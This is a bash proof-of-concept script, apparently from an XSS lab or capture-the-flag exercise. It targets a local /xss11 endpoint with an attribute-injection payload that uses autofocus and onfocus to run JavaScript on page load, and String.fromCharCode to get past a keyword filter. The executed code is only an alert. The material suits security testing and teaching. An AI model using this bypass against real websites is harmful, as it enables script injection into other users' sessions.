#!/bin/bash

# POC: Automatic XSS Execution via Autofocus and Onfocus Event Handler
# Target: /xss11 endpoint
# Vulnerability: XSS filter bypass allowing automatic code execution on page load

TARGET_URL="http://localhost:5000/xss11"

echo "[*] Testing Automatic XSS Execution via Autofocus and Onfocus"
echo "[*] Target: $TARGET_URL"
echo ""

# The payload that bypasses both filters:
# Filter 1: Removes "XSS" or 'XSS' - bypassed by using String.fromCharCode(88,83,83)
# Filter 2: Removes < followed by a-z - bypassed by using attribute injection instead of tag injection
PAYLOAD='" autofocus onfocus="alert(String.fromCharCode(88,83,83))" x="'

echo "[*] Payload: $PAYLOAD"
echo ""

# URL encode the payload for the GET request
ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")

echo "[*] Encoded payload: $ENCODED_PAYLOAD"
echo ""

# Send the request
echo "[*] Sending request..."
RESPONSE=$(curl -s "${TARGET_URL}?input=${ENCODED_PAYLOAD}")

echo "[*] Response received. Analyzing for successful injection..."
echo ""

# Check if the payload made it into the HTML without being filtered
if echo "$RESPONSE" | grep -q 'autofocus'; then
    echo "[+] SUCCESS: autofocus attribute found in response"
else
    echo "[-] FAILED: autofocus attribute not found in response"
fi

if echo "$RESPONSE" | grep -q 'onfocus'; then
    echo "[+] SUCCESS: onfocus event handler found in response"
else
    echo "[-] FAILED: onfocus event handler not found in response"
fi

if echo "$RESPONSE" | grep -q 'String.fromCharCode'; then
    echo "[+] SUCCESS: String.fromCharCode (bypass of XSS string filter) found in response"
else
    echo "[-] FAILED: String.fromCharCode not found in response"
fi

echo ""
echo "[*] Full relevant HTML snippet from response:"
echo "$RESPONSE" | grep -oP '<input[^>]*value="[^"]*autofocus[^"]*"[^>]*>' | head -1 || echo "Searching for injected input element..."

# Alternative search for the injected element
echo ""
echo "[*] Searching for injected input element with autofocus:"
echo "$RESPONSE" | grep -oP '<input[^>]*>' | grep -E 'autofocus.*onfocus|onfocus.*autofocus' | head -1

echo ""
echo "[*] Analysis:"
echo "    - autofocus attribute: Automatically gives focus to element on page load"
echo "    - onfocus event handler: Triggers JavaScript when element receives focus"
echo "    - Combined effect: JavaScript executes automatically without any user interaction"
echo "    - Code executed: alert(String.fromCharCode(88,83,83)) displays 'XSS'"
echo ""

# Show raw HTML containing the injection point
echo "[*] Raw HTML section showing injection:"
echo "$RESPONSE" | sed -n '/<input value="/p' | head -5